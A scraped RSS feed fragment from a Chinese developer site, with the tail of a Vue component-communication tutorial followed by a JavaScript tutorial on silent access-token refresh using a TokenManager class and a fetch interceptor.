<p>4.2.1 事件冒泡（emit）​</p>
<p>中间层组件通过emit触发事件，顶层容器监听并处理（如保存成功后刷新表格）：</p>
<pre><code class="hljs language-js" lang="js">    <span class="hljs-comment">// 中间层：create-form.vue 触发事件​</span>

<span class="hljs-keyword">const</span> emit = <span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">"command"</span>]);​

<span class="hljs-keyword">const</span> <span class="hljs-title function_">save</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {​

<span class="hljs-comment">// 保存逻辑...​</span>

<span class="hljs-title function_">emit</span>(<span class="hljs-string">"command"</span>, { ​

<span class="hljs-attr">event</span>: <span class="hljs-string">"tableRefresh"</span>, <span class="hljs-comment">// 事件类型​</span>

<span class="hljs-attr">params</span>: { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> } <span class="hljs-comment">// 附加参数​</span>

});​

};​

​

<span class="hljs-comment">// 顶层：schema-view.vue 监听事件​</span>

&lt;component​

v-<span class="hljs-keyword">for</span>=<span class="hljs-string">"(item, comName) in components"</span>​

:key=<span class="hljs-string">"comName"</span>​

:is=<span class="hljs-string">"ComponentConfig[comName]?.component"</span>​

@command=<span class="hljs-string">"handleComponentCommand"</span>​

/&gt;​

​

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleComponentCommand</span> = (<span class="hljs-params">{ event, params }</span>) =&gt; {​

<span class="hljs-keyword">if</span> (event === <span class="hljs-string">"tableRefresh"</span>) {​

<span class="hljs-comment">// 执行表格刷新逻辑​</span>

<span class="hljs-title function_">tableRefresh</span>();​

}​

};
</code></pre>
<p>4.2.2 组件接口暴露（defineExpose）​</p>
<p>顶层容器通过ref获取中间层组件的实例，直接调用组件的方法（如主动显示编辑表单并回显数据）：
​</p>
<pre><code class="hljs language-js" lang="js">&lt;component​

<span class="hljs-keyword">const</span> comRefs = <span class="hljs-title function_">ref</span>({}); <span class="hljs-comment">// 组件实例集合​</span>

​

<span class="hljs-comment">// 编辑按钮点击：主动调用edit-form的show方法并传参​</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleEdit</span> = (<span class="hljs-params">row</span>) =&gt; {​

<span class="hljs-keyword">const</span> editCom = comRefs.<span class="hljs-property">value</span>.<span class="hljs-property">editForm</span>;​

<span class="hljs-keyword">if</span> (editCom) {​

editCom.<span class="hljs-title function_">show</span>({ ​

<span class="hljs-attr">data</span>: row, <span class="hljs-comment">// 回显数据（如product_id、product_name）​</span>

<span class="hljs-attr">callback</span>: <span class="hljs-function">() =&gt;</span> { <span class="hljs-comment">/* 编辑完成回调 */</span> }​

});​

}​

};​

&lt;/script&gt;​

​

&lt;!-- 中间层：edit-form.<span class="hljs-property">vue</span> 暴露show方法 --&gt;​

&lt;script setup&gt;​

<span class="hljs-keyword">const</span> <span class="hljs-title function_">show</span> = (<span class="hljs-params">options</span>) =&gt; {​

<span class="hljs-keyword">const</span> { data } = options;​

<span class="hljs-comment">// 数据回显到表单​</span>

<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(data).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {​

formModel.<span class="hljs-property">value</span>[key] = data[key];​

});​

isShow.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;​

};​

​

<span class="hljs-title function_">defineExpose</span>({ show }); <span class="hljs-comment">// 暴露方法给顶层调用​</span>

&lt;/script&gt;
</code></pre>
<h2 data-id="heading-17">五、方案总结与扩展建议​</h2>
<ol>
<li>配置驱动开发：通过 JSON 配置实现组件的动态渲染，新增业务页面无需编写组件代码，仅需配置schemaConfig；​</li>
</ol>

<ol start="2">
<li>分层解耦：三层组件结构职责清晰（顶层容器、中间层框架、底层控件），便于维护和扩展；​</li>
</ol>

<ol start="3">
<li>通信高效：结合provide/inject和emit，实现跨层级通信，避免冗余的 props 传递；​</li>
</ol>

<ol start="4">
<li>规范统一：API 交互遵循 REST 规范，组件配置遵循统一格式，降低团队协作成本。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 封装无感 token 刷新]]></title>    <link>https://juejin.cn/post/7579813925996052521</link>    <guid>https://juejin.cn/post/7579813925996052521</guid>    <pubDate>2025-12-04T12:42:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579813925996052521" data-draft-id="7579846685070524470" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 封装无感 token 刷新"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-04T12:42:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jingyou"/> <meta itemprop="url" content="https://juejin.cn/user/3167069035309015"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 封装无感 token 刷新
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3167069035309015/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jingyou
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T12:42:00.000Z" title="Thu Dec 04 2025 12:42:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><code>accessToken</code>过期后使用<code>refreshToken</code>调用<strong>刷新 token</strong> 接口去获取新的<code>accessToken</code></p>
</blockquote>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// tokenManager.js</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenManager</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 用于存储刷新token的promise，防止并发刷新</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span> = <span class="hljs-literal">null</span>
  }

  <span class="hljs-comment">/**
   * 设置访问token
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">token</span>
   */</span>
  <span class="hljs-title function_">setToken</span>(<span class="hljs-params">token</span>) {
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'accessToken'</span>, token)
  }

  <span class="hljs-comment">/**
   * 获取刷新token
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">string|null</span>}
   */</span>
  <span class="hljs-title function_">getRefreshToken</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'refreshToken'</span>)
  }

  <span class="hljs-comment">/**
   * 移除所有token信息
   */</span>
  <span class="hljs-title function_">removeToken</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'accessToken'</span>)
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'refreshToken'</span>)
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'name'</span>)
  }

  <span class="hljs-comment">/**
   * 调用接口刷新token
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;Response&gt;</span>}
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">refreshAccessToken</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 这里是刷新token的接口</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/v3/Logon/getRefreshUserToker'</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      <span class="hljs-attr">headers</span>: {
        <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
        <span class="hljs-string">'X-Refresh-Token'</span>: <span class="hljs-string">'true'</span>,
      },
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
        <span class="hljs-attr">refreshToken</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getRefreshToken</span>(),
        <span class="hljs-attr">name</span>: <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'name'</span>),
      }),
    })
    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>()
  }

  <span class="hljs-comment">/**
   * 获取token，如果正在刷新则返回同一个promise
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;boolean&gt;</span>} 刷新成功返回true，失败返回false
   */</span>
  <span class="hljs-title function_">refreshToken</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span>) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span>

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">refreshAccessToken</span>()
        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
          <span class="hljs-keyword">if</span> (res.<span class="hljs-property">code</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setToken</span>(res.<span class="hljs-property">accessToken</span>)
            <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">true</span>)
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">removeToken</span>()
            <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
          }
        })
        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Refresh token failed'</span>, err)
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">removeToken</span>()
          <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
        })
    })

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span>.<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span> = <span class="hljs-literal">null</span>
    })
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span>
  }
}

<span class="hljs-keyword">const</span> tokener = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TokenManager</span>()

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> tokener
</code></pre>
<h2 data-id="heading-0">在响应拦截中使用刷新token</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// request.js</span>
<span class="hljs-keyword">import</span> tokener <span class="hljs-keyword">from</span> <span class="hljs-string">'./tokenManager.js'</span>

<span class="hljs-comment">/**
 * 请求封装
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">url</span>
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">RequestInit</span>} <span class="hljs-variable">options</span>
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;any&gt;</span>}
 */</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">request</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">url, options = {}</span>) =&gt; {
  <span class="hljs-comment">// 合并默认配置</span>
  <span class="hljs-keyword">const</span> config = {
    ...options,
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
      ...options.<span class="hljs-property">headers</span>,
    },
  }

  <span class="hljs-comment">// 添加token</span>
  <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'accessToken'</span>)
  <span class="hljs-keyword">if</span> (token) {
    config.<span class="hljs-property">headers</span>[<span class="hljs-string">'Authorization'</span>] = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>
  }

  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url, config)

    <span class="hljs-comment">// 拦截 401 未授权，且不是刷新token的请求</span>
    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> === <span class="hljs-number">401</span> &amp;&amp; !config.<span class="hljs-property">headers</span>[<span class="hljs-string">'X-Refresh-Token'</span>]) {
      <span class="hljs-comment">// 尝试刷新token</span>
      <span class="hljs-keyword">const</span> isRefreshSuccess = <span class="hljs-keyword">await</span> tokener.<span class="hljs-title function_">refreshToken</span>()

      <span class="hljs-keyword">if</span> (isRefreshSuccess) {
        <span class="hljs-comment">// 刷新成功，重试原请求</span>
        <span class="hljs-comment">// 更新header中的token</span>
        <span class="hljs-keyword">const</span> newToken = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'accessToken'</span>)
        config.<span class="hljs-property">headers</span>[<span class="hljs-string">'Authorization'</span>] = <span class="hljs-string">`Bearer <span class="hljs-subst">${newToken}</span>`</span>

        <span class="hljs-comment">// 重新发起请求</span>
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(url, config).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 刷新失败，抛出错误或跳转登录</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Token refresh failed'</span>)
        <span class="hljs-comment">// window.location.href = '/login'</span>
        <span class="hljs-comment">// 可以记录当前页面，重新登陆后跳转到当前页面</span>
        <span class="hljs-comment">// localStorage.setItem('redirectUrl', window.location.href)</span>
      }
    }

    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>()
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Request failed:'</span>, error)
    <span class="hljs-keyword">throw</span> error
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> request
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>